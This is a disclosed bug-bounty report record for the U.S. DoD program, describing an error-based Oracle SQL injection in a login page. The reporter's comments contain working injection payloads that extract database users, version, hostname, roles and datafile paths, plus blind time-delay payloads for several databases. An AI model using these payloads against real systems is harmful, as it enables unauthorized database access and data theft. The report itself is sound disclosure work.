{"id":447742,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80NDc3NDI=","url":"https://hackerone.com/reports/447742","title":"SQL Injection in Login Page: https://█████/█████████/login.php","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2018-11-20T16:11:30.338Z","submitted_at":"2018-11-20T16:11:30.338Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"l00ph0le","url":"/l00ph0le","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/012/963/cbd75f8c49a36b6f3bdb9d8ac16a57611f6a5975_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":16064,"url":"https://hackerone.com/deptofdefense","handle":"deptofdefense","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"U.S. Dept Of Defense","twitter_handle":"DC3VDP","website":"https://bit.ly/2Rt5QhM","about":""}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2020-05-14T16:48:11.416Z","bug_reporter_agreed_on_going_public_at":"2019-12-04T13:54:02.490Z","team_member_agreed_on_going_public_at":"2020-05-14T16:48:11.280Z","comments_closed?":true,"facebook_team?":false,"team_private?":false,"vulnerability_information":"**Summary:**\nI believe I've discovered an error based SQL injection in the login page for https://████/██████/login.php.\n\n**Description:**\nWhen browsing to the webpage https://█████/██████/login.php and entering certain control characters into the \"Username\" field, and SQL error (Oracle) is produced.\n\n## Impact\nThis is hard to gauge as I did not attempt to fully exploit the SQL injection point. Once I identified that it was an error-based SQL injection, I stopped. The website also has a Web Application Firewall and IPS implemented, so bypasses would need to be used to fully exploit it. I didn't know the rules for this program in regard to bypasses defenses with automated tools like sqlmap the --tamper parameter. \n\n## Step-by-step Reproduction Instructions\n\n1. Browse to https://█████████/███/login.php\n2. Enter \" '; --  \" into the username field\n3. The error \"ORA-00933: SQL command not properly ended\" is produced\n\n## Product, Version, and Configuration (If applicable)\n██████████ █████████ Portal\nVersion: 3.0.89\nLast Modified: Oct 04, 2018 \n\n## Suggested Mitigation/Remediation Actions\nParameterized queries should be used to separate the command and data portions of the intended query to the database. These queries prevent an attacker from tampering with the query logic and extending a concatenated database query string. Code reviews should be conducted to identify any additional areas were the application or other applications in the organization are vulnerable to this attack.\nAdditionally, input validation should be enforced on the server side in order to ensure that only expected data is sent in queries. Where possible security specific libraries should be used in order to provide an additional layer of protection.\n\n## Impact\n\nA skilled attacker could likely gain access to the database for the website, and depending on the privileges of the database user, gain access to other databases or compromise the system hosting the database engine.","weakness":{"id":67,"name":"SQL Injection"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":11,"voters":["daehee","sameerphad72","aporlorxl23","dastan_9408","b2e03cf86efe1b26323c39c","mehxus","sl33pyp0t4t0","animall","brutuspt","rrivera","and 1 more..."],"severity":{"rating":"high","author_type":"Team"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":3685890,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Greetings from the Department of Defense (DoD),\n\nThank you for supporting the DoD Vulnerability Disclosure Program (VDP).\n\nBy submitting this report, you acknowledge understanding of, and agreement to, the DoD Vulnerability Disclosure Policy as detailed at @DeptofDefense.\n\nThe VDP Team will review your report to ensure compliance with the DoD Vulnerability Disclosure Policy.  If your report is determined to be out-of-scope, it will be closed without action.\n\nWe will attempt to validate in-scope vulnerability reports and may request additional information from you if necessary. We will forward reports with validated vulnerabilities to DoD system owners for their action.\n\nOur goal is to provide you with status updates not less than every two weeks until the reported vulnerability is resolved.\n\nRegards,\n\nThe VDP Team","automated_response":true,"created_at":"2018-11-20T16:11:30.882Z","updated_at":"2018-11-20T16:11:30.882Z","actor":{"url":"/deptofdefense","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"U.S. Dept Of Defense"}},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3710195,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi U.S. DoD,\n\nAfter further research, I have confirmed that a SQL injection does exist and can be exploited. I found by modifying my original payload in step# 2, I was able to return a list of users in the database.\n\nModified instructions for reproduction.\n1. Browse to https://████/█████████/login.php\n2. Enter \" \nor 1=utl_inaddr.get_host_address((select sys.stragg (distinct username||chr(32)) from all_users))-- \" into the username field\n3. The error \"ORA-29257: host ███████ \" is produced\n\nThank you\n\n~Nick","automated_response":false,"created_at":"2018-11-26T16:57:01.307Z","updated_at":"2020-05-14T16:45:07.012Z","actor":{"username":"l00ph0le","cleared":true,"url":"/l00ph0le","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/963/cbd75f8c49a36b6f3bdb9d8ac16a57611f6a5975_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3710214,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Sorry, in the payload I missed a single quote. The correct payload is:\n\nEnter \" ' or 1=utl_inaddr.get_host_address((select sys.stragg (distinct username||chr(32)) from all_users))-- \" into the username field","automated_response":false,"created_at":"2018-11-26T17:00:17.567Z","updated_at":"2018-11-26T17:00:17.567Z","actor":{"username":"l00ph0le","cleared":true,"url":"/l00ph0le","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/963/cbd75f8c49a36b6f3bdb9d8ac16a57611f6a5975_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3710242,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Here is a another payload to get the Oracle version.\n\n\" ' or 1=utl_inaddr.get_host_address((select banner from v$version where rownum=1))-- \"\n","automated_response":false,"created_at":"2018-11-26T17:05:06.740Z","updated_at":"2018-11-26T17:05:06.740Z","actor":{"username":"l00ph0le","cleared":true,"url":"/l00ph0le","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/963/cbd75f8c49a36b6f3bdb9d8ac16a57611f6a5975_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3711449,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Below I've provided four more example payloads that should help with gauging the impact of this vulnerability. I was not able to provide an impact in my original report. I'd say the impact is fairly high. \n\nThe SQL injection is unauthenicated, we are able to gather the server's hostname, database user's role information, and database file location on the server. It should be noted that the database user has\nthe \"DBA\" role permission, making it an administrator of the database.\n\nCurrent Database User\n\" ' or 1=utl_inaddr.get_host_address((select user from dual))-- \"\n\nDatabase Server Hostname\n\" ' or 1=utl_inaddr.get_host_address((select global_name from global_name))-- \"\n\nCurrent Database User's roles\n\" ' or 1=utl_inaddr.get_host_address((select sys.stragg(distinct granted_role||chr(32)) from user_role_privs))-- \"\nDatabase file location\n\" ' or 1=utl_inaddr.get_host_address((SELECT name FROM V$DATAFILE where rownum = 1))-- \"\n\nI believe this should be enough information to validate the vulnerability/risk from your end. Please let me know if you need further information. My apologies for the choppiness of the report.\n\nThank you\n\n~Nick","automated_response":false,"created_at":"2018-11-26T19:23:22.370Z","updated_at":"2018-11-26T19:23:22.370Z","actor":{"username":"l00ph0le","cleared":true,"url":"/l00ph0le","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/963/cbd75f8c49a36b6f3bdb9d8ac16a57611f6a5975_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3734730,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","automated_response":false,"created_at":"2018-11-29T20:08:44.704Z","updated_at":"2018-11-29T20:08:44.704Z","additional_data":{"old_severity":null,"new_severity":"High","old_severity_id":null,"new_severity_id":252418},"actor":{"username":"ag3nt-j1","cleared":false,"url":"/ag3nt-j1","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3734731,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Greetings,\n\nWe have validated the vulnerability you reported and are preparing to forward this report to the affected DoD system owner for resolution.\n\nThank you for bringing this vulnerability to our attention!\n\nWe will endeavor to answer any questions the system owners may have regarding this report; however, there is a possibility we will need to contact you if they require more information to resolve the vulnerability.\n\nYou will receive another status update after we have confirmed your report has been resolved by the system owner. If you have any questions, please let me know.\n\nThanks again for supporting the DoD Vulnerability Disclosure Program.\n\nRegards,\n\nThe VDP Team","automated_response":false,"created_at":"2018-11-29T20:08:45.562Z","updated_at":"2018-11-29T20:08:45.562Z","actor":{"username":"ag3nt-j1","cleared":false,"url":"/ag3nt-j1","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3734928,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you! If you need anything else, let me know.","automated_response":false,"created_at":"2018-11-29T20:41:10.033Z","updated_at":"2018-11-29T20:41:10.033Z","actor":{"username":"l00ph0le","cleared":true,"url":"/l00ph0le","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/963/cbd75f8c49a36b6f3bdb9d8ac16a57611f6a5975_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3738477,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for finding and submitting.  Sorry it took so long to validate your finding, your report fell off my plate for some reason and I missed it.","automated_response":false,"created_at":"2018-11-30T12:16:00.847Z","updated_at":"2018-11-30T12:16:00.847Z","actor":{"username":"ag3nt-j1","cleared":false,"url":"/ag3nt-j1","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3738720,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"No problem at all. I figured you were probably playing catch-up from the Thanksgiving holiday.","automated_response":false,"created_at":"2018-11-30T13:17:13.167Z","updated_at":"2018-11-30T13:17:13.167Z","actor":{"username":"l00ph0le","cleared":true,"url":"/l00ph0le","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/963/cbd75f8c49a36b6f3bdb9d8ac16a57611f6a5975_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3785564,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Good news!\n\nThe vulnerability you reported has been resolved and this report is now closed. If you have any further questions or disagree that the report is resolved, please let us know.\n\nThank you for your time and effort to improve the security of the DoD information network.\n\nRegards,\n\nThe VDP Team","automated_response":false,"created_at":"2018-12-07T13:07:25.828Z","updated_at":"2018-12-07T13:07:25.828Z","actor":{"username":"ag3nt-j1","cleared":false,"url":"/ag3nt-j1","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"l00ph0le","url":"/l00ph0le"},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3785569,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@l00ph0le I'm not 100% convinced that the system owner fixed the issue.  Looks like all they may have done was set a minimum/maximum username length.  I tried some other queries and coludn't get anything to pop.  Closing this as resolved, but feel free to take another look.  Would be happy to reopen if you can find something else. ","automated_response":false,"created_at":"2018-12-07T13:10:03.116Z","updated_at":"2018-12-07T13:10:03.116Z","actor":{"username":"ag3nt-j1","cleared":false,"url":"/ag3nt-j1","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3785736,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@ag3nt-j1 It looks like they have limited the username field to 25 characters. In addition to limiting the username length, it appears they have either sanitized the control characters \" '; -- \" or they have suppressed the error messages from being echo'd on the login page. If we assume they only have suppressed the error messages, it turns it into a Blind SQL injection. In order for an attacker to find it, they would need to discover a blind sql injection payload (time-based likely) that could fit into 25 characters. The blind injection payload would give the attacker a visual indication their sql injection is succeeding, like making the page pause for a few seconds before it loads. To find a payload that is 25 characters to do this isn't too hard if the back-end was a mysql or microsoft sql (i.e.mysql:-SLEEP(15) mssql:' waitfor delay '0:0:9' --). Fortunately the back-end is oracle and blind sql injection payloads are a little more complicated. An example payload would be: BEGIN DBMS_LOCK.SLEEP(15); END;. This payload is over 25 characters. So even if an attacker found one to fit, the length limitation would make data exfiltration nearly impossible. They would need more space to ask true or false questions and get their answer based on if the page pause for a few seconds. In my opinion, assuming they didn't parameterize the SQL statement, their fix should mitigate any exploitation attempts of the vulnerability. My apologies if I shared any information you are already aware of, I just felt it would make more sense if the explained my thought process fully.","automated_response":false,"created_at":"2018-12-07T13:40:42.914Z","updated_at":"2018-12-07T13:40:42.914Z","actor":{"username":"l00ph0le","cleared":true,"url":"/l00ph0le","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/963/cbd75f8c49a36b6f3bdb9d8ac16a57611f6a5975_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3785756,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Also I noticed looking through some of the DoD hacktivity, there are some reports that were allowed to be disclosed by the hackerone user (example https://hackerone.com/reports/311922). Is that not the case anymore? Do you allow a summary. I understand if you don't.","automated_response":false,"created_at":"2018-12-07T13:45:38.023Z","updated_at":"2018-12-07T13:45:38.023Z","actor":{"username":"l00ph0le","cleared":true,"url":"/l00ph0le","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/963/cbd75f8c49a36b6f3bdb9d8ac16a57611f6a5975_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6466292,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Would it be ok to disclose this report with redactions?","automated_response":false,"created_at":"2019-12-04T13:54:02.503Z","updated_at":"2019-12-04T13:54:02.503Z","first_to_agree":true,"actor":{"username":"l00ph0le","cleared":true,"url":"/l00ph0le","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/963/cbd75f8c49a36b6f3bdb9d8ac16a57611f6a5975_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6467170,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"We will put it in the queue for disclosure. ","automated_response":false,"created_at":"2019-12-04T15:50:38.151Z","updated_at":"2019-12-04T15:50:38.151Z","actor":{"username":"agent-r5","cleared":false,"url":"/agent-r5","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8002105,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Thanks for participating in the DoD Vulnerability Disclosure Program. We're publicly disclosing your resolved report at this time.  We also lock the report on the disclosure but feel free to reach out to us at VDP-Questions@dc3.mil if there are any questions, concerns or issues.","automated_response":false,"created_at":"2020-05-14T16:48:11.299Z","updated_at":"2020-05-14T16:48:11.299Z","actor":{"username":"ag3nt-j1","cleared":false,"url":"/ag3nt-j1","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8002106,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2020-05-14T16:48:11.444Z","updated_at":"2020-05-14T16:48:11.444Z","actor":{"username":"ag3nt-j1","cleared":false,"url":"/ag3nt-j1","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8002110,"is_internal":false,"editable":false,"type":"Activities::CommentsClosed","message":"","automated_response":false,"created_at":"2020-05-14T16:48:19.850Z","updated_at":"2020-05-14T16:48:19.850Z","actor":{"url":"/deptofdefense","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"U.S. Dept Of Defense"}},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}